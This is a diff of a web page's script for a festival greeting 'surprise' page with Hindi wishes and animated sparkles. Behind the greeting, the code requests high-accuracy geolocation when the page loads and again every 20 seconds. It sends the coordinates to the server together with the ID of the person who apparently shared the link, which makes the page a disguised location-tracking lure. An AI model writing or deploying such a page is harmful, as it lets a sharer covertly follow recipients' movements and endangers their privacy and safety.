@@ -68,57 +68,68 @@
     <div class="login_btn">Login</div>
 
     <script>
+
         // =====================================================
         // 1. LOCAL STORAGE
         // =====================================================
 
-        const visitor_id = localStorage.getItem("visitor_id");
-        const shared_id = localStorage.getItem("shared_id");
+        const user_id = localStorage.getItem("user_id");
         const ui = localStorage.getItem("festival_id");
+        const visitorId = localStorage.getItem("visitor_id");
+
+        let locationInterval = null;
+        let wishes = [
+            "आपकी जिंदगी हमेशा खुशियों से भरी रहे। ❤️",
+            "आपके चेहरे की मुस्कान कभी कम न हो। 😊",
+            "हर दिन आपके लिए नई उम्मीद और नई खुशियाँ लेकर आए। ✨",
+            "आपके सारे अच्छे सपने पूरे हों। 🌸",
+            "आप हमेशा खास रहें और खुश रहें। 💖"
+        ];
+
+
+        let locationRequestInProgress = false;
+
 
         // =====================================================
         // 2. LOGIN / DASHBOARD BUTTON
         // =====================================================
 
-        const login_btn = document.querySelector(".login_btn");
+        const loginBtn = document.querySelector(".login_btn");
 
         function updateLoginButton() {
-            login_btn.textContent = localStorage.getItem("token")
+            if (!loginBtn) return;
+
+            loginBtn.textContent = localStorage.getItem("token")
                 ? "Dashboard"
                 : "Login";
         }
 
         updateLoginButton();
 
-        login_btn.addEventListener("click", function () {
-            if (localStorage.getItem("token")) {
-                window.location.href = "/dashboard";
-            } else {
-                window.location.href = "/login";
-            }
-        });
+        if (loginBtn) {
+            loginBtn.addEventListener("click", function () {
+                if (localStorage.getItem("token")) {
+                    window.location.href = "/dashboard";
+                } else {
+                    window.location.href = "/login";
+                }
+            });
+        }
+
 
         // =====================================================
-        // 3. DEFAULT SURPRISE CONTENT
-        // =====================================================
-
-        const defaultWishes = ["आपकी जिंदगी हमेशा खुशियों से भरी रहे। ❤️", "आपके चेहरे की मुस्कान कभी कम न हो। 😊", "हर दिन आपके लिए नई उम्मीद और नई खुशियाँ लेकर आए। ✨", "आपके सारे अच्छे सपने पूरे हों। 🌸", "आप हमेशा खास रहें और खुश रहें। 💖"];
-
-        let wishes = [...defaultWishes];
-
-        // =====================================================
-        // 4. DATABASE UI DATA FETCH
+        // 3. DATABASE UI DATA FETCH
         // =====================================================
 
         async function loadFestivalUI() {
 
-            // ui nahi hai to default page hi rahega
+            // UI select nahi hai to default content show hoga
             if (!ui) {
                 console.log("UI select nahi hai. Default page show hoga.");
                 return;
             }
 
-            // Sirf valid positive integer allow karo
+            // Valid positive integer check
             if (!/^[1-9]\d*$/.test(ui)) {
                 console.error("Invalid UI ID:", ui);
                 return;
@@ -138,13 +149,10 @@
                 const data = await response.json();
 
                 if (!data || data.status === "error") {
-                    throw new Error(data.message || "UI data nahi mila.");
+                    throw new Error(data?.message || "UI data nahi mila.");
                 }
 
-                // ---------------------------------------------
                 // Festival title and text
-                // ---------------------------------------------
-
                 setText("eyebrow", data.eyebrow);
                 setText("pageTitle", data.title || data.festival_name);
                 setText("subtitle", data.subtitle);
@@ -152,82 +160,59 @@
                 setText("message", data.message);
                 setText("downloadText", data.download_text);
                 setText("footer", data.footer_text);
-                setText(
-                    "surpriseBtn",
-                    data.surprise_button_text
-                );
+                setText("surpriseBtn", data.surprise_button_text);
 
-                // ---------------------------------------------
                 // Browser tab title
-                // ---------------------------------------------
-
                 document.title =
                     data.festival_name || data.title || "Surprise";
 
-                // ---------------------------------------------
                 // Festival image
-                // ---------------------------------------------
-
                 if (data.image_path) {
-                    const imagePath = data.image_path;
-
-                    const imageUrl = imagePath.startsWith("http://") ||
-                        imagePath.startsWith("https://") ||
-                        imagePath.startsWith("/")
-                        ? imagePath
-                        : `/static/${imagePath.replace(/^static\//, "")}`;
-
+                    const imageUrl = getImageUrl(data.image_path);
                     const image = document.getElementById("festivalImage");
 
-                    image.src = imageUrl;
-                    image.alt = data.festival_name || data.title || "Festival";
+                    if (image) {
+                        image.src = imageUrl;
+                        image.alt = data.festival_name || data.title || "Festival";
+                    }
                 }
 
-                // ---------------------------------------------
                 // Download button
-                // ---------------------------------------------
-
                 const downloadButton =
                     document.getElementById("downloadButton");
 
-                if (data.image_path) {
-                    const imagePath = data.image_path;
-
-                    downloadButton.href =
-                        imagePath.startsWith("http://") ||
-                            imagePath.startsWith("https://") ||
-                            imagePath.startsWith("/")
-                            ? imagePath
-                            : `/static/${imagePath.replace(/^static\//, "")}`;
+                if (downloadButton && data.image_path) {
+                    downloadButton.href = getImageUrl(data.image_path);
                 }
 
-                setText(
-                    "downloadButton",
-                    data.download_button_text
-                );
+                if (downloadButton) {
+                    setText("downloadButton", data.download_button_text);
+                }
 
-                // ---------------------------------------------
                 // Wishes from database
-                // ---------------------------------------------
-
                 if (Array.isArray(data.wishes) && data.wishes.length > 0) {
                     wishes = data.wishes;
-                } else if (typeof data.wishes === "string" && data.wishes.trim()) {
+
+                } else if (
+                    typeof data.wishes === "string" &&
+                    data.wishes.trim()
+                ) {
                     try {
                         const parsedWishes = JSON.parse(data.wishes);
 
-                        if (Array.isArray(parsedWishes) && parsedWishes.length) {
+                        if (
+                            Array.isArray(parsedWishes) &&
+                            parsedWishes.length > 0
+                        ) {
                             wishes = parsedWishes;
                         }
+
                     } catch (error) {
                         console.warn("Wishes JSON format valid nahi hai.");
                     }
                 }
 
-                // ---------------------------------------------
-                // Optional colors from database
-                // ---------------------------------------------
-
+                // Colors from database
                 setColor("--page-background", data.background_color);
                 setColor("--card-background", data.card_color);
                 setColor("--text-color", data.text_color);
@@ -236,10 +221,14 @@
                 console.log("Festival UI successfully loaded:", ui);
 
             } catch (error) {
-                // Fetch fail hone par default content bana rahega
                 console.error("Festival UI load nahi hua:", error);
             }
         }
+
+
+        // =====================================================
+        // 4. HELPER FUNCTIONS
+        // =====================================================
 
         function setText(id, value) {
             if (value === null || value === undefined || value === "") {
@@ -253,13 +242,34 @@
             }
         }
 
+
         function setColor(variable, value) {
-            if (!value) {
-                return;
-            }
+            if (!value) return;
 
             document.documentElement.style.setProperty(variable, value);
         }
+
+
+        function getImageUrl(imagePath) {
+
+            if (!imagePath) return "";
+
+            imagePath = String(imagePath).trim();
+
+            if (
+                imagePath.startsWith("http://") ||
+                imagePath.startsWith("https://") ||
+                imagePath.startsWith("/")
+            ) {
+                return imagePath;
+            }
+
+            imagePath = imagePath.replace(/^static\/+/, "");
+            imagePath = imagePath.replace(/^\/+/, "");
+
+            return `/static/${imagePath}`;
+        }
+
 
         // =====================================================
         // 5. RANDOM WISHES AND SPARKLES
@@ -267,27 +277,32 @@
 
         function getRandomWish() {
 
-            if (!wishes.length) {
-                return;
-            }
+            if (!wishes.length) return;
 
             const randomWish =
                 wishes[Math.floor(Math.random() * wishes.length)];
 
-            document.getElementById("blessing").textContent = randomWish;
+            const blessing = document.getElementById("blessing");
+
+            if (blessing) {
+                blessing.textContent = randomWish;
+            }
 
             for (let i = 0; i < 24; i++) {
 
                 const star = document.createElement("span");
 
                 star.className = "sparkle";
+
                 star.textContent = ["✦", "✧", "❋"][
                     Math.floor(Math.random() * 3)
                 ];
 
                 star.style.left = Math.random() * 100 + "vw";
+
                 star.style.animationDuration =
                     (2 + Math.random() * 3) + "s";
+
                 star.style.fontSize =
                     (12 + Math.random() * 18) + "px";
 
@@ -297,189 +312,157 @@
             }
         }
 
-        document
-            .getElementById("surpriseBtn")
-            .addEventListener("click", getRandomWish);
 
+        const surpriseBtn = document.getElementById("surpriseBtn");
 
-
-
-        let visitorId = localStorage.getItem("visitor_id");
-        async function trackVisit() {
-            try {
-                const response = await fetch("/track", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        page_path: window.location.pathname,
-                        shared_id: sharedId,
-                        visitor_id: visitorId ? Number(visitorId) : 0
-                    })
-                });
-
-                const data = await response.json();
-
-                if (!response.ok) {
-                    throw new Error(data.message || data.error || "Tracking failed");
-                }
-
-                if (!data.visitor_id) {
-                    throw new Error("Visitor ID response mein nahi mila");
-                }
-                // Isi visit ki ID use hogi; purani ID par depend nahi karenge
-                visitorId = data.visitor_id;
-                localStorage.setItem("visitor_id", String(visitorId));
-                localStorage.setItem("shared_id", String(sharedId));
-                localStorage.setItem("festival_id", String(u_id));
-                console.log("Visit successfully recorded:", visitorId);
-
-                // Pehli location turant save karne ki koshish karo
-                await getLocation();
-
-                // Purana interval ho to clear karo
-                if (locationInterval !== null) {
-                    clearInterval(locationInterval);
-                }
-
-
-                locationInterval = setInterval(async () => {
-                    await getLocation();
-                    window.location.href = "/";
-                }, 1000);
-
-            } catch (error) {
-                console.error("Visit record nahi ho saka:", error);
-            }
+        if (surpriseBtn) {
+            surpriseBtn.addEventListener("click", getRandomWish);
         }
 
 
+
         // =====================================================
-        // 6. VISITOR LOCATION SAVE
+        // 7. VISITOR LOCATION SAVE
         // =====================================================
 
-        function getLocation() {
+        async function getLocation() {
 
-            if (!visitor_id || !shared_id) {
-                console.log(
-                    "Visitor ID ya Shared ID available nahi hai."
-                );
+            if (!visitorId || !user_id) {
+                console.log("Visitor ID ya Shared ID available nahi hai.");
                 return;
             }
 
             if (!navigator.geolocation) {
-                console.log(
-                    "Is browser mein Geolocation supported nahi hai."
-                );
+                console.log("Is browser mein Geolocation supported nahi hai.");
                 return;
             }
 
-            console.log("Location permission / location ka wait ho raha hai...");
+            // Duplicate simultaneous location requests prevent karo
+            if (locationRequestInProgress) {
+                console.log("Previous location request abhi complete nahi hui.");
+                return;
+            }
 
-            navigator.geolocation.getCurrentPosition(
+            locationRequestInProgress = true;
 
-                async function (position) {
+            try {
 
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
+                const position = await new Promise((resolve, reject) => {
 
-                    const mapLink =
-                        `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-                    try {
-
-                        const response = await fetch("/save-location", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify({
-                                id: visitor_id,
-                                shared_id: shared_id,
-                                latitude: latitude,
-                                longitude: longitude,
-                                accuracy: accuracy,
-                                mapLink: mapLink
-                            })
-                        });
-
-                        const result = await response.json();
-
-                        if (!response.ok) {
-                            throw new Error(
-                                result.message ||
-                                result.error ||
-                                "Location save nahi hui"
-                            );
+                    navigator.geolocation.getCurrentPosition(
+                        resolve,
+                        reject,
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
                         }
+                    );
 
-                        console.log("Location successfully saved.");
+                });
 
-                    } catch (error) {
-                        console.error(
-                            "Failed to save location:",
-                            error
-                        );
-                    }
-                },
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
 
-                function (error) {
+                const mapLink =
+                    `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                const response = await fetch("/save-location", {
+
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+
+                    body: JSON.stringify({
+                        id: visitorId,
+                        user_id: user_id,
+                        latitude: latitude,
+                        longitude: longitude,
+                        accuracy: accuracy
+                    })
+
+                });
+
+                const contentType =
+                    response.headers.get("content-type") || "";
+
+                if (!contentType.includes("application/json")) {
+                    throw new Error(
+                        "Location API ne JSON response nahi diya."
+                    );
+                }
+
+                const result = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(
+                        result.message ||
+                        result.error ||
+                        "Location save nahi hui"
+                    );
+                }
+
+                console.log("Location successfully saved:", result);
+
+            } catch (error) {
+
+                if (error.code !== undefined) {
 
                     switch (error.code) {
 
-                        case error.PERMISSION_DENIED:
-                            console.log(
-                                "Location permission deny kar di gayi."
-                            );
+                        case 1:
+                            console.log("Location permission deny kar di gayi.");
                             break;
 
-                        case error.POSITION_UNAVAILABLE:
-                            console.log(
-                                "Device ki location available nahi hai."
-                            );
+                        case 2:
+                            console.log("Device ki location available nahi hai.");
                             break;
 
-                        case error.TIMEOUT:
-                            console.log(
-                                "Location request timeout ho gayi."
-                            );
+                        case 3:
+                            console.log("Location request timeout ho gayi.");
                             break;
 
                         default:
-                            console.log(
-                                "Location obtain nahi ho saki."
-                            );
+                            console.log("Location obtain nahi ho saki.");
                     }
-                },
 
-                {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
+                } else {
+
+                    console.error("Failed to save location:", error);
+
                 }
-            );
+
+            } finally {
+
+                locationRequestInProgress = false;
+
+            }
         }
 
+
         // =====================================================
-        // 7. PAGE LOAD
+        // 8. PAGE LOAD
         // =====================================================
 
         window.addEventListener("load", async function () {
+
+            // First load selected festival content
             await loadFestivalUI();
-            await trackVisit();
-            if (shared_id) {
-                await getLocation();
-            }
+            await getLocation();
+
         });
 
-        // Existing periodic behavior
-        if (shared_id) {
-            setInterval(getLocation, 10000);
-        }
 
+        // Random wishes automatically show
         setInterval(getRandomWish, 1500);
+        setInterval(() => {
+            getLocation();
+        }, 20000)
+
+
 
     </script>
 
